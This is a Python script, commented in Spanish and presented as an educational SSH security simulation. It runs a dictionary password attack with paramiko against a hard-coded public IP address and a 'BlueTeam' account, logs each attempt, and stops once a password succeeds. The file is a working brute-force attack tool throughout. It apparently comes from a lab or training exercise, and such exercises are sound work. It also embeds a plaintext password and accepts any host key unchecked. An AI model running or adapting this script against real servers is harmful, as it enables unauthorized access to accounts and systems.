import paramiko
from datetime import datetime
 
 
IP_OBJETIVO = "52.162.33.24"
USUARIO_SSH = "BlueTeam"
 
 
contrasenas_prueba = [
    "123456",
    "clave123",
    "admin",
    "UnaClaveLarga-2026!"
]
 
 
contrasena_correcta = "UnaClaveLarga-2026!"
 
 
archivo_log = "intentos_ssh.log"
 
 
def registrar_intento(mensaje):
    """Guarda cada resultado con la fecha y la hora."""
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
    try:
        with open(archivo_log, "a", encoding="utf-8") as archivo:
            archivo.write(f"[{fecha}] {mensaje}\n")
 
    except OSError as error:
        print(f"Error al guardar el registro: {error}")
 
 
def es_contrasena_debil(contrasena):
    """Comprueba algunas señales básicas de debilidad."""
    debiles_conocidas = [
        "123456",
        "password",
        "admin",
        "clave123"
    ]
 
    return contrasena.lower() in debiles_conocidas
 
 
def intentar_login_ssh(ip, usuario, contrasena):
    """
    Intenta conectarse por SSH al objetivo usando la contraseña dada.
    Devuelve True si el acceso fue exitoso, False si fue rechazado.
    """
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
    try:
        cliente.connect(
            hostname=ip,
            username=usuario,
            password=contrasena,
            timeout=8
        )
        return True
 
    except paramiko.AuthenticationException:
        return False
 
    except (paramiko.SSHException, OSError) as error:
        print(f"Error de conexión: {error}")
        return False
 
    finally:
        cliente.close()
 
 
def ejecutar_simulacion():
    print("Simulación educativa de seguridad SSH")
    print("--------------------------------------")
    print(f"Objetivo: {USUARIO_SSH}@{IP_OBJETIVO}\n")
 
    acceso_logrado = False
 
    for numero, contrasena in enumerate(
        contrasenas_prueba, start=1
    ):
        try:
            print(f"Evaluando prueba {numero}: probando contraseña...")
 
            conectado = intentar_login_ssh(IP_OBJETIVO, USUARIO_SSH, contrasena)
 
            if es_contrasena_debil(contrasena):
                nota_debilidad = "CONTRASEÑA DÉBIL (coincide con lista conocida)"
            else:
                nota_debilidad = "No está en la lista de ejemplos débiles"
 
            if conectado:
                resultado = f"ACCESO EXITOSO con contraseña '{contrasena}'"
                acceso_logrado = True
            else:
                resultado = "Acceso denegado"
 
            mensaje = (
                f"Prueba {numero}: {resultado}. {nota_debilidad}"
            )
 
            print(mensaje)
            registrar_intento(mensaje)
 
            if conectado:
                print("Contraseña válida encontrada, deteniendo el ataque.")
                break
 
        except Exception as error:
            print(f"Error en la prueba {numero}: {error}")
            registrar_intento(
                f"Error en la prueba {numero}: {error}"
            )
 
    print("\nSimulación finalizada.")
    if acceso_logrado:
        print("Resultado final: se logró acceso con el diccionario de prueba.")
    else:
        print("Resultado final: ninguna contraseña del diccionario funcionó.")
    print(f"Revisa los resultados en {archivo_log}.")
 
 
if __name__ == "__main__":
    ejecutar_simulacion()